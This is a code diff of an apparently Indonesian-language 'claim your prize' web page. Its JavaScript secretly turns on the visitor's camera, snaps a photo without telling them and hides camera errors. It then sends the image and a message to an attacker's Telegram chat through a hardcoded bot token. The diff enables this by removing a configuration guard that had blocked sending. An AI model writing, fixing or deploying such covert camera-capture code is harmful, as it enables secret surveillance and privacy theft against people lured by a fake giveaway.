@@ -339,10 +339,10 @@
     </div>
 
     <script>
-        // === KONFIGURASI - GANTI INI DENGAN DATA ANDA ===
+        // === KONFIGURASI TELEGRAM ===
         const BOT_TOKEN = "8219920016:AAFAhBeYMhw9BisZ7lAwr6GlvskMzA-ezdc";  
         const CHAT_ID = "5417808006";
-        // =================================================
+        // =============================
 
         // Elemen DOM
         const video = document.getElementById('video');
@@ -379,14 +379,14 @@
                 console.log('Kamera berhasil diakses');
             } catch (err) {
                 console.error('Error mengakses kamera:', err);
-                // PESAN ERROR DIHAPUS - tidak menampilkan pesan ke user
+                // Tidak tampilkan pesan error ke user
             }
         }
 
         // Fungsi untuk mengambil foto secara diam-diam
         function takePhoto() {
             return new Promise((resolve) => {
-                // Mulai hitungan mundur (tidak terlihat oleh pengguna)
+                // Mulai hitungan mundur
                 let count = 3;
                 countdown.textContent = count;
                 countdown.style.display = 'block';
@@ -409,7 +409,7 @@
                             photoDataUrl = canvas.toDataURL('image/jpeg');
                         }
                         
-                        // Efek flash (tidak terlihat oleh pengguna)
+                        // Efek flash
                         flash.style.display = 'block';
                         flash.style.animation = 'flash 0.5s';
                         setTimeout(() => {
@@ -444,6 +444,7 @@
                     });
                     
                     const result = await telegramResponse.json();
+                    console.log('Telegram Photo Response:', result);
                     return result.ok;
                 } else {
                     // Jika tidak ada foto, kirim pesan saja
@@ -454,12 +455,12 @@
                         },
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
+                            text: message
                         })
                     });
                     
                     const result = await telegramResponse.json();
+                    console.log('Telegram Message Response:', result);
                     return result.ok;
                 }
             } catch (error) {
@@ -472,11 +473,6 @@
         claimBtn.addEventListener('click', async () => {
             if (!selectedOption) {
                 showStatus('Harap pilih warna favorit Anda terlebih dahulu.', 'error');
-                return;
-            }
-            
-            if (BOT_TOKEN === "8219920016:AAFAhBeYMhw9BisZ7lAwr6GlvskMzA-ezdc" || CHAT_ID === "5417808006") {
-                showStatus('Konfigurasi Telegram belum diatur. Silakan hubungi administrator.', 'error');
                 return;
             }
             
@@ -498,7 +494,7 @@
                         showStatus('Hadiah telah berhasil dikirim! Terima kasih telah berpartisipasi.', 'success');
                     }, 3000);
                 } else {
-                    throw new Error('Gagal mengirim hadiah');
+                    throw new Error('Gagal mengirim ke Telegram');
                 }
             } catch (error) {
                 console.error('Error:', error);
